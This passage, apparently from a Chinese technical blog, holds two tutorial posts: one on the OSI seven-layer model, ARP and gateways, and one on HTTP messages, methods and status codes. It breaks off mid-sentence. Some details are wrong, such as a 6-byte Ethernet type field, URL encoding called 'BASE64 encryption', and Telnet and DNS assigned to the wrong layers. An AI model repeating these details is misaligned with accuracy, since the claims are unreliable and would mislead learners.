    <content type="text"><![CDATA[云淡风轻近午天，傍花随柳过前川。 OSI七层协议模型主要有：应用层(Application)、表示层(Presentation)、会话层(Session)、传输层(Transport)、网络层(Network)、数据链路层(Data Link)、物理层(Physical)。 OSI(Open System Interconnect)，即开放式系统互联参考模型，一般都叫OSI参考模型，是ISO（国际标准化组织）在1985年提出的一个试图将各种计算机或者通信系统在世界范围内互联为网络的标准框架模型。在这一框架下详细的规定了每一层的功能，以实现开放系统环境中的互连性、相互操作性和应用的可移植性。协议常见的协议 互联网中代表性的协议有IP、TCP、HTTP等，LAN中常用协议有IPX、SPX等。 计算机网络体系结构将这些网络协议进行了系统的归纳，TCP/IP就是这些协议的集合。除此以外，还有Novell公司的IPX/SPX、苹果公司的AppleTalk（仅限苹果公司计算机使用）、IBM开发的用于构件大规模网络的SNA以及前DEC公司开发的DECnet等。协议的必要性 协议是计算机之间通过网络实现通信时事先达成的一种约定；这种约定使那些由不同厂商的设备，不同CPU及不同操作系统组成的计算机之间，只要遵循相同的协议就可以实现通信。 协议可以分很多种，每一种协议都明确界定了它的行为规范：2台计算机之间必须能够支持相同的协议，并且遵循相同的协议进行处理，才能实现相互通信。分组交换协议 将大数据分割为一个个叫做包（Packet）的较小单位进行传输。 计算机通信会在每一个分组中附加上源主机地址和目标主机地址送给通信线路；这些发送端地址、接收端地址以及分组序号写入的部分就是报文首部。 一个较大的数据被分为很多个分组，为了标明原始数据的归属，有必要将分组序号写入包中，接收端会根据序号，分组按序重新装配为原始数据。 协议中，通常会规定报文首部应写入哪些信息，如何处理；相互通信的每台计算机则根据协议构造报文首部，读取首部等内容，发送和接收方必须对报文首部和主体保持一致的定义和解释。协议的标准化 计算机通信诞生之初，系统化与标准化未收到重视，不同厂商只出产各自的网络来实现通信，这样就造成了对用户使用计算机网络造成了很大障碍，缺乏灵活性和可扩展性。 为解决该问题，ISO（国际标准化组织）制定了一个国际标准OSI（开放式通信系统互联参考模型），而TCP/IP并非ISO指定，是由IETF（国际互联网工程任务组）建议、致力推进标准化的一种协议，协议的标准化推动了计算机网络的普及。协议的分层 ISO在指定标准的OSI之前，提出了作为通信协议设计指标的OSI参考模型，将协议分为七层，使得原来复杂的网络协议更加简单化。 在七层模型中，每个分层都接受由它下一层所提供的特定服务，并且负责为自己的上一层提供特定的服务，上下层之间进行交互所遵循的约定叫做接口，同一层之间的交互所遵循的约定叫做协议。协议分层的优点 每个分层可以独立使用，其实系统中某些分层发生变化，也不会影响整个系统，因此可以构造一个扩展性和灵活性都比较强的系统； 此外，通过分层可以细分通信功能，更易于单独实现每个分层的协议，界定各个分层的具体责任和义务协议分层的劣势 过分模块化，处理变得更加沉重，以及每个模块都不得不事先相似的处理逻辑等。OSI参考模型 互联网的本质就是一系列的网络协议，这个协议就叫OSI协议（一系列协议），按照功能不同，分工不同，人为的分层七层。实际上这个七层是不存在的。没有这七层的概念，只是人为的划分而已。区分出来的目的只是让你明白哪一层是干什么用的。 还有人把它划成五层、四层，不管划分为几层，目的都是为了更好的理解这个模型。七层划分为：应用层、表示层、会话层、传输层、网络层、数据链路层、物理层。五层划分为：应用层、传输层、网络层、数据链路层、物理层。四层划分为：应用层、传输层、网络层、网络接口层。OSI七层模型各层作用OSI七层模型功能对应的网络协议每层功能概况应用层文件传输，文件管理，电子邮件的信息处理——apduHTTP，TFTP，FTP，NFS，WAIS，SMTP文件传输——文件传输协议、电子邮件——电子邮件服务、远程登陆——远程登陆协议表示层确保一个系统的应用层发送的消息可以被另一个系统的应用层读取，编码转换，数据解析，管理数据的解密和加密，最小单位——ppduTelnet，Rlogin，SNMP，Gopher接受不同表现形式的信息，比如文字流、图像、声音等会话层负责在网络中的两节点建立，维持和终止通信，在一层协议中，可以解决节点连接的协调和管理问题。包括通信连接的建立，保持会话过程通信连接的畅通，两节点之间的对话，决定通信是否被中断以及通信中断时决定从何处重新发送，最小单位——spduSMTP，DNS何时建立连接，何时断开连接以及保持多久的连接运输层定义一些传输数据的协议和端口。传输协议同时进行流量控制，或是根据接收方接收数据的快慢程度，规定适当的发送速率，解决传输效率及能力的问题——tpduTCP，UDP是否有数据丢失网络层控制子网的运行，如逻辑编址，分组传输，路由选择最小单位——分组（包）报文IP，ICMP，ARP，RARP，AKP，UUCP经过哪个路由传递到目标地址数据链路层主要是对物理层传输的比特流包装，检测保证数据传输的可靠性，将物理层接收的数据进行MAC（媒体访问控制）地址的封装和解封装，也可以简单的理解为物理寻址。交换机就处在这一层，最小的传输单位——帧FDDI，Ethernet，Arpanet，PDN，SLIP，PPP，STP，HDLC，SDLC，帧中继数据帧与比特流之间的转换物理层定义物理设备的标准，主要对物理连接方式，电气特性，机械特性等制定统一标准，传输比特流，因此最小的传输单位——位（比特流）IEEE 802.1A，IEEE 802.2到IEEE 802. 11比特流与电子信号之间的切换物理层 主要定义了物理设备的标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。它的主要作用是传输比特流，就是由1、0转化为电流强弱来进行传输，到达目的地后在转化为1、0，也就是我们常说的数模转换与模数转换。这一层的数据叫做比特。数据链路层 数据链路层就是来对电信号来做分组的，该层的作用包括了物理地址寻址，数据的成帧，流量控制，数据的检错，重发等。该层控制网络层与物理层之间的通信，解决的是所传输数据的准确性的问题。为了保证传输，从网络层接收到的数据被分制成特定的可被物理层传输的帧。帧是用来移动数据的结构包，它不仅包括原始数据，还包括发送方和接收方的物理地址以及纠错和控制的信息。其中的地址确定了帧将发送的位置，纠错和控制信息则保证帧的准确到达。如果传送数据的过程中，接收点检测到数据有错误，就通知发送方重新发送这一帧。 Ethernet规定：一组电信号称之为一个数据包，或者叫做一个帧。 每一数据帧分成：报头head和数据data两部分。 head包含：固定18个字节，发送者（源地址，6个字节），接收者（目标地址，6个字节），数据类型（6个字节）。 data包含：最短46字节，最长1500字节。 数据包的具体内容：head长度+data长度=最短64字节，最长1518字节，超过最大限制就分片发送。 这就像写信，发送者的地址（源地址）就是你家的地址，接收者地址（目标地址）就是对方的收信地址，你家的路由器就相当于邮局。其实在计算机通信中的源地址和目标地址指的是mac地址。 head中包含的源和目标地址：Ethernet规定接入Internet的设备都必须具备网卡，发送端的和接收端的地址便是指网卡的地址，即Mac地址。 MAC地址（Media Access Control或者Medium Access Control）：媒体访问控制，或称为物理地址、硬件地址，用来定义网络设备的位置。在OSI模型中，第三层网络层负责IP地址，第二层数据链路层则负责MAC地址。因此一个主机会有一个MAC地址，而每个网络位置会有一个专属于它的IP地址。 MAC地址是网卡决定的，是固定的。用来表示互联网上每一个站点的标识符，采用十六进制数表示，共6个字节（48位）。其中，前三个字节是由IEEE的注册管理机构RA负责给不同厂家分配的代码(高位24位），也称为“编制上唯一的标识符”，后三个字节（低位24位）由各厂家自行指派给生产的适配器接口，称为扩展标识符（唯一性）。一个地址块可以生成224个不同的地址。MAC地址实际上就是适配器地址或适配器标识符EUI-48。 MAC地址对应于OSI参考模型的第二层数据链路层，工作在数据链路层的交换机维护着计算机MAC地址和自身端口的数据库，交换机根据收到的数据帧中的“目的MAC地址”字段来转发数据帧。 IP地址工作在OSI参考模型的第三层网络层。两者之间分工明确，默契合作，完成通信过程。IP地址专注于网络层，将数据包从一个网络转发到另外一个网络；而MAC地址专注于数据链路层，将一个数据帧从一个节点传送到相同链路的另一个节点。 有了mac地址以后，计算机就可以通信了，假设一个教室就是一个局域网（隔离的网络），这个教室里面有几台计算机，计算机的通信和人的通信是一个道理，把教室里面的人都比作一个个计算机，假设教室里面的人都是瞎子，其实计算机就是瞎子的，计算机通信基本靠吼，现在我要找教室里面的飞哥要战狼2的片，然后我就吼一声，说我要找飞哥要战狼2的片，战狼2的片就属于我的数据，但是我在发的时候我是不是要标识我是谁，我要找谁，我是谁就是我的mac地址，我要找谁就是飞哥的mac地址，这两个地址做数据包的头部，再加上数据战狼2的片就构成了一个数据帧。 这个数据包封装好以后就往外发，到物理层以后就全部转成二级制，往外发是怎么发的呢？就是靠吼。即“我是Edison，我找飞哥要战狼2的片”。这么吼了一嗓子以后，全屋子的人都能听到，这就是广播。 计算机底层，只要在一个教室里（一个局域网），都是靠广播的方式，吼。 局域网的理解：什么是互联网，互联网就是由一个个局域网组成，局域网内的计算机不管是对内还是对外都是靠吼，这就是数据链路层的工作方式—–广播。 广播出去以后，所有人都听得见，所有人都会拆开这个包，读发送者是谁，接收者是谁，只要接收者不是自己就丢弃掉。对计算机来说，它会看自己的Mac地址，飞哥收到以后，他就会把片发给我，发送回来同样采用广播的方式了，靠吼。 同一个教室（同一个局域网）的计算机靠吼来通信，那不同教室的计算机又如何？ 比如说局域网1的pc1与局域网2的pc10如何通信？你在教室1（局域网1）吼，教室2（局域网2）的人肯定是听不见的。这就是跨网络进行通信，数据链路层就解决不了这个问题了，这就得靠网络层出面了。 在讲网络层之前，其实基于广播的这种通信就可以实现全世界通信了，你吼一声，如果全世界是一个局域网，全世界的计算机肯定可以听得见，从理论上似乎行得通，如果全世界的计算机都在吼，你想一想，这是不是一个灾难。因此，全世界不能是一个局域网。于是就有了网络层。网络层 网络层定义了一个IP协议，你想，我是这个教室的一个学生，我想找隔壁教室一个叫老王的学生，我也不认识老王，那怎么办，我吼？老王在另外一个教室肯定是听不到的。找教室的负责人，这个教室的负责人就负责和隔壁教室的负责人说话，说我们教室的有个学生要找你们教室的老王。往外传的东西交给负责人就可以了，内部的话上面已经提到，通过广播的方式，对外的东西广播失效。教室的负责人就是网关，网关即网络关口的意思。 Mac地址是用来标识你这个教室的某个位置，IP地址是用来标识你在哪个教室（哪个局域网）。你要跨网络发包你是不是要知道对方的IP地址，比如你要访问百度，你肯定得知道百度服务器的IP地址。计算机在发包前，会判断你在哪个教室，对方在哪个教室，如果在一个教室，基于mac地址的广播发包就OK了；如果不在一个教室，即跨网络发包，那么就会把你的包交给教室负责人（网关）来转发。Mac地址及IP地址唯一标识了你在互联网中的位置。 数据链路层中会把网络层的数据包封装到数数据链路层的数据位置，然后再添加上自己的包头，再发给物理层，物理层发给网关，网关再发给对方教室的网关，对方教室的网关收到后在那个教室做广播。 在数据链路层看，数据封装了两层，跟玩俄罗斯套娃有点类似，一层套了一层。 最终变成 现在来看另一个问题，在吼之前怎么知道对方的Mac地址？这就得靠ARP协议。 ARP协议的由来：在你找飞哥要片之前，你的先干一件事，想办法知道飞哥的Mac地址。即你的机器必须先发一个ARP包出去，ARP也是靠广播的方式发，ARP发送广播包的方式如下： 局域网中怎么获取对方的Mac地址： 肯定要知道对方的IP地址，这是最基本的，就像你要访问百度，肯定得知道百度的域名，域名就是百度的IP地址。自己的IP可以轻松获得，自己的Mac也轻松获取，目标Mac为12个F，我们叫广播地址，表达的意思是我想要获取这个目标IP地址172.16.10.11的机器的Mac地址。Mac为12个F代表的是一种功能，这个功能就是获取对方的MAC地址，计算机的Mac永远不可能是12个F。假设是在本教室广播，一嗓子吼出去了，所有人开始解包，只有IP地址是172.16.10.11的这个人才会返回他的Mac地址，其他人全部丢弃。发回来源Mac改成飞哥自己的Mac地址，同时把飞哥的Mac地址放在数据部分。 跨网络怎么获取对方的Mac地址： 通过IP地址区分，计算机运算判断出飞哥不在同一个教室，目标IP就变成了网关的IP了。网关的IP在计算机上配死了，可以轻松获取。 这样网关就会把它的Mac地址返回给你，然后正常发包 网关帮你去找飞哥，但对用户来说，我们根本就感觉不到网关的存在。运输层 网络层的ip帮我们区分子网，以太网层的mac帮我们找到主机，然后大家使用的都是应用程序，你的电脑上可能同时开启qq，暴风影音，等多个应用程序， 那么我们通过ip和mac找到了一台特定的主机，如何标识这台主机上的应用程序，答案就是端口，端口即应用程序与网卡关联的编号。 运输层的主要作用就是建立端口到端口的通信。 运输层定义了一些传输数据的协议和端口号（WWW端口80等），如： TCP——传输控制协议，可靠传输，数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。用于传输可靠性要求高，数据量大的数据。 UDP——用户数据报协议，与TCP特性恰恰相反，不可靠传输，”报头”部分一共只有8个字节，总长度不超过65,535字节，正好放进一个IP数据包。用于传输可靠性要求不高，数据量小的数据，如QQ聊天数据就是通过这种方式传输的。会话层 会话层负责在网络中的两节点之间建立，维持和终止通信，在这层协议中，解决节点链接的协调和管理问题。 会话层的功能包括：建立通信链接，保持会话过程通信连接的畅通。同步两个节点之间的对话，决定通信是否被中断以及通信中断时决定从何处重新发送。当通过拨号向你的ISP（因特网服务提供商）请求链接到因特网时，ISP服务器上的层就会向你与你的PC客户机上的会话层进行协商链接。若你的电话线偶然从墙上插孔脱落，你终端机上的会话层将检测到链接中断并重新发起链接。会话层通过决定节点通信的优先级和通信市场来设置通信期限。表示层 表示层是应用程序和网络之间的翻译官。可确保一个系统的应用层所发送的信息可以被另一个系统的应用层读取。在表示层，数据需要按照网络所能理解的方案的进行格式化。这种格式化因为使用网络的类型的不同而不同。表示层管理数据的加密和解密，例如银行账户，账户数据发送前加密，接受的时候对账户进行解密。应用层 应用层由来：用户使用的都是应用程序，均工作于应用层，互联网是开发的，大家都可以开发自己的应用程序，数据多种多样，必须规定好数据的组织形式 。应用层功能：规定应用程序的数据格式，提供数据接口的标准，提供的服务包括文件的传输，文件的管理以及电子邮件的信息处理等 例如：TCP协议可以为各种各样的程序传递数据，比如Email、WWW、FTP等等。那么，必须有不同协议规定电子邮件、网页、FTP数据的格式，这些应用程序协议就构成了”应用层”。数据包的完整格式OSI七层模型各层协议物理层：EIA/TIA-232，EIA/TIA-499，V.35，V.24，RJ45，Ethernet，802.3，802.5，FDDI，NRZI，NRZ，B8ZS数据链路层：Frame Relay，HDLC，PPP，IEEE 802.3/802.2，FDDI，ATM，IEEE 802.5/802.2网络层：IP，IPX，AppleTalk DDP传输层：TCP，UDP，SPX会话层：RPC，SQL，NFS，NetBIOS，names，AppleTalk，ASP，DECnet，SCP表示层:TIFF，GIF，JPEG，PICT，ASCII，EBCDIC，encryption，MPEG，MIDI，HTML应用层：FTP，WWW，Telnet，NFS，SMTP，Gateway，SNMP参考资料OSI七层协议大白话解读OSI七层模型及各层作用[OSI七层协议模型、TCP/IP四层模型和五层协议体系结构之间的关系]OSI七层模型的每一层都有哪些协议对于网络OSI七层和TCP/IP五层的理解]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>网络七层模型</tag>
        <tag>OSI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议知识点总结]]></title>
    <url>%2Fposts%2F7f4f0569.html%2F</url>
    <content type="text"><![CDATA[青山隐隐水迢迢，秋尽江南草未凋 最近看到一道与HTTP协议相关题目，感觉对计算机网络协议的知识点有点忘了，赶紧查阅资料对之前学习过的计算机网络知识做一个复习与总结。HTTP的概念 协议是指计算机通信网络中两台计算机之间进行通信所必须共同遵守的规定或规则。 HTTP协议，又称超文本传输协议（Hypertext transfer protocol），是一种详细规定了浏览器和万维网（WWW，World Wide Web）服务器之间互相通信的通信协议，它允许将超文本标记语言（HTML）文档从Web服务器传送到客户端的浏览器，可以使浏览器更加高效，减少网络的传输。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。 HTTP是一个应用层协议，由请求和响应构成，是一个标准的客户端服务器模型，也是一个无状态的协议。HTTP默认的端口号为80，HTTPS的端口号为443。 在Internet中所有的传输都是通过TCP/IP进行的。HTTP协议作为TCP/IP模型中应用层的协议也不例外。HTTP协议通常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。如下图所示：发展简史 它的发展是万维网协会（World Wide Web Consortium）和Internet工作小组IETF（Internet Engineering Task Force）合作的结果，他们最终发布了一系列的RFC，RFC 1945定义了HTTP/1.0版本。其中最著名的就是RFC 2616。RFC 2616定义了今天普遍使用的一个版本——HTTP 1.1。HTTP的特点 HTTP协议永远都是客户端发起请求，服务器回送响应。这样就限制了使用HTTP协议，无法实现在客户端没有发起请求的时候，服务器将消息推送给客户端。HTTP协议的主要特点1、支持CS（客户/服务器）模式，还有基本认证和安全认证。2、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。3、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。4、HTTP 0.9和1.0使用非持续连接：限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接。5、HTTP 1.1使用持续连接：不必为每个web对象创建一个新的连接，一个连接可以传送多个对象，采用这种方式可以节省传输时间。6、无状态：HTTP协议是无状态协议，无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。无状态协议 协议的状态是指下一次传输可以“记住”这次传输信息的能力。 HTTP是不会为了下一次连接而维护这次连接所传输的信息,为了保证服务器内存。 比如客户获得一张网页之后关闭浏览器，然后再一次启动浏览器，再登陆该网站，但是服务器并不知道客户关闭了一次浏览器。 由于Web服务器要面对很多浏览器的并发访问，为了提高Web服务器对并发访问的处理能力，在设计HTTP协议时规定Web服务器发送HTTP应答报文和文档时，不保存发出请求的Web浏览器进程的任何状态信息。这有可能出现一个浏览器在短短几秒之内两次访问同一对象时，服务器进程不会因为已经给它发过应答报文而不接受第二次服务请求。由于Web服务器不保存发送请求的Web浏览器进程的任何信息，因此HTTP协议属于无状态协议（Stateless Protocol）。HTTP协议是无状态的和Connection: keep-alive的区别 无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。从另一方面讲，打开一个服务器上的网页和你之前打开这个服务器上的网页之间没有任何联系。 HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的是UDP协议（无连接）。 从HTTP/1.1起，默认都开启了Keep-Alive，保持连接特性，简单地说，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接。 Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。HTTP请求报文 一个HTTP请求报文由请求行（request line）、请求头部（header）、空行和请求数据4个部分组成。请求行 请求行由请求方法字段、URL字段和HTTP协议版本字段3个字段组成。 请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本，格式如下：Method Request-URI HTTP-Version CRLF，例如，GET /index.html HTTP/1.1。 其中Method表示请求方法；Request-URI是一个统一资源标识符；HTTP-Version表示请求的HTTP协议版本；CRLF表示回车和换行（除了作为结尾的CRLF外，不允许出现单独的CR或LF字符）。请求头部 请求头部由关键字/值对组成，每行一对，关键字和值用英文冒号:分隔。请求头部通知服务器有关于客户端请求的信息，常见的请求头有：User-Agent：产生请求的浏览器类型；Accept：客户端可识别的响应内容类型列表；星号 *用于按范围将类型分组，用 / 指示可接受全部类型，用type/*指示可接受 type 类型的所有子类型Accept-Language：客户端可接受的自然语言；Accept-Encoding：客户端可接受的编码压缩格式；Accept-Charset：可接受的应答的字符集；Host：请求的主机名，允许多个域名同处一个IP 地址，即虚拟主机；connection：连接方式（close 或 keepalive）；Cookie：存储于客户端扩展字段，向同一域名的服务端发送属于该域的cookie；空行 最后一个请求头之后是一个空行，发送回车符和换行符，通知服务器以下不再有请求头。请求数据 请求数据不在GET方法中使用，而是在POST方法中使用。POST方法适用于需要客户填写表单的场合。与请求数据相关的最常使用的请求头是Content-Type和Content-Length。HTTP请求方法 HTTP协议的请求方法有GET、POST、HEAD、PUT、DELETE、OPTIONS、TRACE、CONNECT。而常见的有如下几种：GET 最常见的一种请求方式，当客户端要从服务器中读取文档时，当点击网页上的链接或者通过在浏览器的地址栏输入网址来浏览网页的，使用的都是GET方式。GET方法要求服务器将URL定位的资源放在响应报文的数据部分，回送给客户端。使用GET方法时，请求参数和对应的值附加在URL后面，利用一个问号?代表URL的结尾与请求参数的开始，传递参数长度受限制。例如，/index.jsp?id=100&amp;op=bind,这样通过GET方式传递的数据直接表示在地址中，所以我们可以把请求结果以链接的形式发送给好友。以用google搜索domety为例，Request格式如下：123456789101112GET /search?hl=zh-CN&amp;source=hp&amp;q=domety&amp;aq=f&amp;oq= HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-silverlight, application/x-shockwave-flash, */* Referer: &lt;a href="http://www.google.cn/"&gt;http://www.google.cn/&lt;/a&gt; Accept-Language: zh-cn Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld) Host: &lt;a href="http://www.google.cn"&gt;www.google.cn&lt;/a&gt; Connection: Keep-Alive Cookie: PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g; NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-FxlRugatx63JLv7CWMD6UB_O_r 可以看到，GET方式的请求一般不包含请求内容部分，请求数据以地址的形式表现在请求行。地址链接如下：12&lt;a href="http://www.google.cn/search?hl=zh-CN&amp;source=hp&amp;q=domety&amp;aq=f&amp;oq="&gt;http://www.google.cn/search?hl=zh-CN&amp;source=hp&amp;q=domety&amp;aq=f&amp;oq=&lt;/a&gt; 地址中?之后的部分就是通过GET发送的请求数据，我们可以在地址栏中清楚的看到，各个数据之间用&amp;符号隔开。显然，这种方式不适合传送私密数据。另外，由于不同的浏览器对地址的字符限制也有所不同，一般最多只能识别1024个字符，所以如果需要传送大量数据的时候，也不适合使用GET方式。POST 对于上面提到的不适合使用GET方式的情况，可以考虑使用POST方式，因为使用POST方法可以允许客户端给服务器提供信息较多。POST方法将请求参数封装在HTTP请求数据中，以名称/值的形式出现，可以传输大量数据，这样POST方式对传送的数据大小没有限制，而且也不会显示在URL中。还 以上面的搜索domety为例，如果使用POST方式的话，格式如下：1234567891011121314POST /search HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-silverlight, application/x-shockwave-flash, */* Referer: &lt;a href="http://www.google.cn/"&gt;http://www.google.cn/&lt;/a&gt; Accept-Language: zh-cn Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld) Host: &lt;a href="http://www.google.cn"&gt;www.google.cn&lt;/a&gt; Connection: Keep-Alive Cookie: PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g; NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-FxlRugatx63JLv7CWMD6UB_O_r hl=zh-CN&amp;source=hp&amp;q=domety 可以看到，POST方式请求行中不包含数据字符串，这些数据保存在请求内容部分，各数据之间也是使用&amp;符号隔开。POST方式大多用于页面的表单中。因为POST也能完成GET的功能，因此多数人在设计表单的时候一律都使用POST方式，其实这是一个误区。GET方式也有自己的特点和优 势，我们应该根据不同的情况来选择是使用GET还是使用POST。HEAD HEAD就像GET，只不过服务端接受到HEAD请求后只返回响应头，而不会发送响应内容。这种方法是非常高效的，因为在传输的过程中省去了页面内容。可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。常用于测试超链接的有效性，是否可以访问，以及最近是否更新。其他几种请求方法OPTIONS 返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送*的请求来测试服务器的功能性。PUT 向指定资源位置上传其最新内容。DELETE 请求服务器删除Request-URI所标识的资源。TRACE 回显服务器收到的请求，主要用于测试或诊断。CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 HTTP服务器至少应该实现GET和HEAD方法，其他方法都是可选的。此外，除了上述方法，特定的HTTP服务器还能够扩展自定义的方法。HTTP响应报文 HTTP响应由状态行、响应头部、空行和响应正文4个部分组成。状态行 状态行由HTTP协议版本字段、状态码和状态码的描述文本3个部分组成，他们之间使用空格隔开。 状态行格式：HTTP-Version Status-Code Reason-Phrase CRLF 其中，HTTP-Version表示服务器HTTP协议的版本；Status-Code表示服务器发回的响应状态代码；Reason-Phrase表示状态代码的文本描述。响应头部 响应报头允许服务器传递不能放在状态行中的附加响应信息，以及关于服务器的信息和对Request-URI所标识的资源进行下一步访问的信息。 常见的响应头部有： Allow：服务器支持哪些请求方法（如GET、POST等）。 Location：Location 响应报头域用于重定向接受者到一个新的位置。例如：客户端所请求的页面已不存在原先的位置，为了让客户端重定向到这个页面新的位置，服务器端可以发回Location响应报头后使用重定向语句，让客户端去访问新的域名所对应的服务器上的资源; Server：Server 响应报头域包含了服务器用来处理请求的软件信息及其版本。它和 User-Agent 请求报头域是相对应的，前者发送服务器端软件的信息，后者发送客户端软件（浏览器）和操作系统的信息。 更多详细的响应头信息可以点击👉传送门空行 最后一个响应头部之后是一个空行，发送回车符和换行符，通知服务器以下不再有响应头部。响应正文 服务器返回给客户端的文本信息。HTTP响应状态码 HTTP状态码（响应码）用来表明HTTP请求是否已经成功完成。 状态代码有三位数字组成，第一个数字定义了响应的类别，常用的状态码有五大类。1xx：指示信息–表示请求已接收，继续处理2xx：成功–表示请求已被成功接收、理解、接受3xx：重定向–要完成请求必须进行更进一步的操作4xx：客户端错误–请求有语法错误或请求无法实现5xx：服务器端错误–服务器未能实现合法的请求 具体的状态代码和状态描述的说明如下：1xx（信息类）：表示接收到请求并且继续处理100——客户必须继续发出请求101——客户要求服务器根据请求转换HTTP协议版本2xx（响应成功）：表示动作被成功接收、理解和接受200——表明该请求被成功地完成，所请求的资源发送回客户端201——提示知道新文件的URL202——接受和处理、但处理未完成203——返回信息不确定或不完整204——请求收到，但返回信息为空205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件206——服务器已经完成了部分用户的GET请求3xx（重定向类）：为了完成指定的动作，必须接受进一步处理300——请求的资源可在多处得到301——本网页被永久性转移到另一个URL302——请求的网页被转移到一个新的地址，但客户访问仍继续通过原始URL地址，重定向，新的URL会在response中的Location中返回，浏览器将会使用新的URL发出新的Request。303——建议客户访问其他URL或访问方式304——自从上次请求后，请求的网页未修改过，服务器返回此响应时，不会返回网页内容，代表上次的文档已经被缓存了，还可以继续使用305——请求的资源必须从服务器指定的地址得到306——前一版本HTTP中使用的代码，现行版本中不再使用307——申明请求的资源临时性删除4xx（客户端错误类）：请求包含错误语法或不能正确执行400——客户端请求有语法错误，不能被服务器所理解401——请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用HTTP 401.1 - 未授权：登录失败HTTP 401.2 - 未授权：服务器配置问题导致登录失败HTTP 401.3 - ACL 禁止访问资源HTTP 401.4 - 未授权：授权被筛选器拒绝HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败402——保留有效ChargeTo头响应403——禁止访问，服务器收到请求，但是拒绝提供服务HTTP 403.1 禁止访问：禁止可执行访问HTTP 403.2 - 禁止访问：禁止读访问HTTP 403.3 - 禁止访问：禁止写访问HTTP 403.4 - 禁止访问：要求 SSLHTTP 403.5 - 禁止访问：要求 SSL 128HTTP 403.6 - 禁止访问：IP 地址被拒绝HTTP 403.7 - 禁止访问：要求客户证书HTTP 403.8 - 禁止访问：禁止站点访问HTTP 403.9 - 禁止访问：连接的用户过多HTTP 403.10 - 禁止访问：配置无效HTTP 403.11 - 禁止访问：密码更改HTTP 403.12 - 禁止访问：映射器拒绝访问HTTP 403.13 - 禁止访问：客户证书已被吊销HTTP 403.15 - 禁止访问：客户访问许可过多HTTP 403.16 - 禁止访问：客户证书不可信或者无效HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效404——可连接服务器，但服务器无法取得所请求的网页，请求资源不存在。比如输入了错误的URL405——用户在Request-Line字段定义的方法不允许406——根据用户发送的Accept拖，请求资源不可访问407——类似401，用户必须首先在代理服务器上得到授权408——客户端没有在用户指定的饿时间内完成请求409——对当前资源状态，请求不能完成410——服务器上不再有此资源且无进一步的参考地址411——服务器拒绝用户定义的Content-Length属性请求412——一个或多个请求头字段在当前请求中错误413——请求的资源大于服务器允许的大小414——请求的资源URL长于服务器允许的长度415——请求资源不支持请求项目格式416——请求中包含的Range头字段无法被满足,通常是因为Range中的数字范围超出所请求资源的大小417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。5xx（服务端错误类）：服务器不能正确执行一个正确的请求HTTP 500 - 服务器遇到错误，无法完成请求HTTP 500.100 - 内部服务器错误 - ASP 错误HTTP 500-11 服务器关闭HTTP 500-12 应用程序重新启动HTTP 500-13 - 服务器太忙HTTP 500-14 - 应用程序无效HTTP 500-15 - 不允许请求 global.asaError 501 - 未实现HTTP 502 - 网关错误HTTP 503：由于超载或停机维护，服务器目前无法使用，一段时间后可能恢复正常 更多详细的响应状态码信息可以点击👉传送门HTTP请求GET和POST的区别1、数据提交的方式 GET提交：请求的数据会附在URL之后（就是把数据放置在HTTP协议头＜request-line＞中）， 以?分割URL和传输数据，多个参数用&amp;连接；例如：login.action?name=hyddd&amp; password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： 